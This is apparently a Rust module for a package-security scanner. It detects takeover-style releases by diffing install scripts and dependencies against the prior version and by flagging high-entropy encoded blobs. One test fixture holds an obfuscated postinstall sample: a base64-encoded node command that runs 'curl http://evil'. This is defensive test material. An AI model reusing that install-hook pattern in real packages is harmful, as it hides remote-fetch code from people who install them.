//! Release-anomaly signal.
//!
//! Maintainer-takeover and account-compromise incidents share a fingerprint: a
//! new version that is *almost identical* to the previous one but quietly adds
//! an install-time lifecycle script, pulls in a new dependency, or smuggles an
//! obfuscated payload inside an install script. The metadata-only signals
//! (`lifecycle`, `age`) judge the resolved version in isolation; this signal
//! diffs it against its immediate predecessor and flags what *changed*, which
//! catches a "looks normal" takeover release far better than any single-version
//! check. See ROADMAP.md ("release-anomaly engine").
//!
//! Pure-from-metadata: the previous version's scripts and dependencies are
//! already present in the packument fetched for the resolved version, so this
//! adds no network round-trip.

use std::collections::HashMap;

use crate::signals::registry::PackageMetadata;
use crate::types::{Signal, SignalKind};

const LIFECYCLE_KEYS: &[&str] = &["preinstall", "install", "postinstall"];

/// Minimum length of a base64/hex token before it is considered a candidate
/// obfuscated payload. Legitimate install commands (`node-gyp rebuild`,
/// `prebuild-install || node-gyp rebuild`) never contain unbroken tokens this
/// long.
const BLOB_MIN_LEN: usize = 64;
/// Minimum Shannon entropy (bits/char) for a long token to read as encoded data
/// rather than a long identifier or repeated padding. Hex tops out at 4.0
/// bits/char; 3.5 catches real base64/hex payloads while rejecting low-variety
/// tokens.
const BLOB_MIN_ENTROPY: f64 = 3.5;

/// Dependency growth below this previous-release count is judged by the
/// "new dependency" check alone; the percentage-growth signal needs a
/// meaningful base to avoid firing on a 1 → 2 dependency bump.
const DEP_GROWTH_MIN_BASE: usize = 3;

pub fn evaluate(meta: &PackageMetadata) -> Vec<Signal> {
    let mut out = Vec::new();

    // Obfuscation runs on the resolved version's install scripts regardless of
    // whether a predecessor exists; an obfuscated payload in a first release
    // is no less dangerous than one introduced by a takeover.
    if let Some(detail) = obfuscated_install_script(&meta.scripts) {
        out.push(Signal {
            kind: SignalKind::ReleaseAnomaly,
            points: 30,
            detail,
        });
    }

    let Some(prev) = &meta.previous_version else {
        return out;
    };

    // Newly-added install-time lifecycle scripts: the takeover fingerprint.
    //
    // A near-identical release that quietly introduces a preinstall/install/
    // postinstall script is the canonical maintainer-takeover fingerprint.
    // Scored at 70 so this signal ALONE reaches the block threshold, preserving
    // v0.1.3's effective block behavior without double-counting via the
    // lifecycle signal (which is suppressed when all present scripts are new).
    let added: Vec<&str> = LIFECYCLE_KEYS
        .iter()
        .filter(|k| meta.scripts.contains_key(**k) && !prev.scripts.contains_key(**k))
        .copied()
        .collect();
    if !added.is_empty() {
        out.push(Signal {
            kind: SignalKind::ReleaseAnomaly,
            points: 70,
            detail: format!(
                "lifecycle script(s) added since {}: {} (not present in the previous release)",
                prev.version,
                added.join(", ")
            ),
        });
    }

    // New top-level dependencies absent from the previous release.
    let mut new_deps: Vec<&str> = meta
        .dependencies
        .keys()
        .filter(|d| !prev.dependencies.contains_key(*d))
        .map(String::as_str)
        .collect();
    new_deps.sort_unstable();
    if !new_deps.is_empty() {
        let shown: Vec<&str> = new_deps.iter().copied().take(5).collect();
        let extra = new_deps.len() - shown.len();
        let suffix = if extra > 0 {
            format!(" (+{} more)", extra)
        } else {
            String::new()
        };
        out.push(Signal {
            kind: SignalKind::ReleaseAnomaly,
            points: 25,
            detail: format!(
                "{} new {} since {}: {}{}",
                new_deps.len(),
                if new_deps.len() == 1 {
                    "dependency"
                } else {
                    "dependencies"
                },
                prev.version,
                shown.join(", "),
                suffix
            ),
        });
    }

    // Dependency-count growth over 50% relative to the previous release. Gated
    // on a minimum base count so small packages aren't flagged for a 1 → 2 bump
    // (already covered by the "new dependency" check).
    let prev_count = prev.dependencies.len();
    let cur_count = meta.dependencies.len();
    if prev_count >= DEP_GROWTH_MIN_BASE && cur_count * 2 > prev_count * 3 {
        out.push(Signal {
            kind: SignalKind::ReleaseAnomaly,
            points: 15,
            detail: format!(
                "dependency count grew {} → {} (over 50%) since {}",
                prev_count, cur_count, prev.version
            ),
        });
    }

    out
}

/// Returns a detail string if any install-time lifecycle script body contains a
/// long, high-entropy base64/hex token of the kind used to hide a second-stage
/// payload.
fn obfuscated_install_script(scripts: &HashMap<String, String>) -> Option<String> {
    for key in LIFECYCLE_KEYS {
        let Some(body) = scripts.get(*key) else {
            continue;
        };
        if let Some(len) = longest_encoded_blob(body) {
            return Some(format!(
                "`{}` script contains a {}-char high-entropy blob, possible obfuscated payload",
                key, len
            ));
        }
    }
    None
}

/// Length of the longest contiguous base64/hex-ish token that also clears the
/// entropy bar (i.e. looks like encoded data, not a long path or identifier).
/// `None` when no token qualifies.
fn longest_encoded_blob(s: &str) -> Option<usize> {
    let mut best = 0usize;
    let mut cur = String::new();
    for ch in s.chars() {
        if is_blob_char(ch) {
            cur.push(ch);
        } else {
            best = best.max(qualifying_len(&cur));
            cur.clear();
        }
    }
    best = best.max(qualifying_len(&cur));
    (best > 0).then_some(best)
}

fn qualifying_len(tok: &str) -> usize {
    let len = tok.chars().count();
    if len >= BLOB_MIN_LEN && shannon_entropy(tok) >= BLOB_MIN_ENTROPY {
        len
    } else {
        0
    }
}

/// Characters that make up base64 (`+/=`), base64url (`-_`), and hex tokens.
fn is_blob_char(ch: char) -> bool {
    ch.is_ascii_alphanumeric() || matches!(ch, '+' | '/' | '=' | '-' | '_')
}

/// Shannon entropy in bits per character over the token's bytes.
fn shannon_entropy(s: &str) -> f64 {
    let mut counts = [0usize; 256];
    let mut n = 0usize;
    for b in s.bytes() {
        counts[b as usize] += 1;
        n += 1;
    }
    if n == 0 {
        return 0.0;
    }
    let n = n as f64;
    counts
        .iter()
        .filter(|&&c| c > 0)
        .map(|&c| {
            let p = c as f64 / n;
            -p * p.log2()
        })
        .sum()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::signals::registry::PreviousVersion;
    use chrono::Utc;

    fn meta(
        scripts: &[(&str, &str)],
        deps: &[&str],
        prev: Option<PreviousVersion>,
    ) -> PackageMetadata {
        PackageMetadata {
            name: "pkg".into(),
            resolved_version: "2.0.0".into(),
            published_at: Some(Utc::now()),
            maintainers: vec![],
            scripts: scripts
                .iter()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .collect(),
            dependencies: deps.iter().map(|d| (d.to_string(), "^1".into())).collect(),
            repository_url: None,
            deprecated: None,
            all_versions: vec!["2.0.0".into(), "1.0.0".into()],
            time_map: HashMap::new(),
            previous_version: prev,
        }
    }

    fn prev(scripts: &[(&str, &str)], deps: &[&str]) -> PreviousVersion {
        PreviousVersion {
            version: "1.0.0".into(),
            scripts: scripts
                .iter()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .collect(),
            dependencies: deps.iter().map(|d| (d.to_string(), "^1".into())).collect(),
        }
    }

    #[test]
    fn no_previous_version_yields_no_diff_signal() {
        // No predecessor, no install scripts → nothing to compare, no signal.
        let m = meta(&[], &["lodash"], None);
        assert!(evaluate(&m).is_empty());
    }

    #[test]
    fn identical_release_is_quiet() {
        let m = meta(
            &[("build", "tsc")],
            &["lodash"],
            Some(prev(&[("build", "tsc")], &["lodash"])),
        );
        assert!(evaluate(&m).is_empty());
    }

    #[test]
    fn added_postinstall_flags_takeover_fingerprint() {
        let m = meta(
            &[("postinstall", "node ./setup.js")],
            &[],
            Some(prev(&[], &[])),
        );
        let sigs = evaluate(&m);
        let added = sigs.iter().find(|s| s.points == 70).expect("added-script");
        assert_eq!(added.kind, SignalKind::ReleaseAnomaly);
        assert!(added.detail.contains("postinstall"));
    }

    #[test]
    fn newly_added_install_script_alone_reaches_block_tier() {
        // Deterministic offline check: a release that adds a postinstall not
        // present in the previous version must produce a score >= 70 from
        // release_anomaly alone; no other signals involved.  This locks the
        // block-tier weighting so a de-dup change cannot silently regress
        // detection back to warn.
        let m = meta(
            &[("postinstall", "node ./setup.js")],
            &[],
            Some(prev(&[], &[])),
        );
        let sigs = evaluate(&m);
        let total: u32 = sigs.iter().map(|s| s.points).sum();
        assert!(
            total >= 70,
            "newly-added install script should reach block threshold (>=70) from \
             release_anomaly alone; got total={} from {:?}",
            total,
            sigs
        );
    }

    #[test]
    fn preexisting_lifecycle_script_is_not_re_flagged_as_added() {
        // Script was already there in the previous release; not an anomaly.
        let m = meta(
            &[("postinstall", "node-gyp rebuild")],
            &[],
            Some(prev(&[("postinstall", "node-gyp rebuild")], &[])),
        );
        assert!(evaluate(&m).is_empty());
    }

    #[test]
    fn new_dependency_is_flagged() {
        let m = meta(&[], &["lodash", "evil-pkg"], Some(prev(&[], &["lodash"])));
        let sigs = evaluate(&m);
        let dep = sigs.iter().find(|s| s.points == 25).expect("new-dep");
        assert!(dep.detail.contains("evil-pkg"));
        assert!(dep.detail.contains("1 new dependency"));
    }

    #[test]
    fn dependency_growth_over_50pct_flags_on_meaningful_base() {
        // 4 → 7 deps is >50% growth on a base of 4.
        let m = meta(
            &[],
            &["a", "b", "c", "d", "e", "f", "g"],
            Some(prev(&[], &["a", "b", "c", "d"])),
        );
        let sigs = evaluate(&m);
        assert!(sigs.iter().any(|s| s.points == 15));
    }

    #[test]
    fn small_dependency_bump_does_not_trip_growth_signal() {
        // 1 → 2 deps: the "new dependency" signal fires, but not the
        // percentage-growth one (base below DEP_GROWTH_MIN_BASE).
        let m = meta(&[], &["a", "b"], Some(prev(&[], &["a"])));
        let sigs = evaluate(&m);
        assert!(sigs.iter().any(|s| s.points == 25));
        assert!(!sigs.iter().any(|s| s.points == 15));
    }

    #[test]
    fn obfuscated_payload_in_install_script_is_flagged() {
        // A long, high-entropy base64 blob piped into a shell: classic
        // second-stage smuggling.
        let blob = "ZXZhbCgnY29uc29sZS5sb2coMSknKTtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygnY3VybCBodHRwOi8vZXZpbCcp";
        assert!(blob.len() >= BLOB_MIN_LEN);
        let script = format!("node -e \"$(echo {} | base64 -d)\"", blob);
        let m = meta(
            &[("postinstall", script.as_str())],
            &[],
            Some(prev(&[], &[])),
        );
        let sigs = evaluate(&m);
        assert!(
            sigs.iter().any(|s| s.points == 30),
            "expected obfuscation signal, got {:?}",
            sigs
        );
    }

    #[test]
    fn ordinary_install_command_is_not_flagged_as_obfuscated() {
        let m = meta(
            &[("install", "prebuild-install || node-gyp rebuild")],
            &[],
            Some(prev(
                &[("install", "prebuild-install || node-gyp rebuild")],
                &[],
            )),
        );
        assert!(evaluate(&m).is_empty());
    }

    #[test]
    fn entropy_distinguishes_payload_from_repeated_padding() {
        // 80 identical chars: long but near-zero entropy → not a payload.
        let padding: String = "a".repeat(80);
        assert!(longest_encoded_blob(&padding).is_none());
        // 80 chars of varied base64 → high entropy → flagged.
        let payload =
            "TmV2ZXJHb25uYUdpdmVZb3VVcE5ldmVyR29ubmFMZXREb3duMTIzNDU2Nzg5MEFCQ0RFRkdISUpL";
        assert!(longest_encoded_blob(payload).is_some());
    }
}
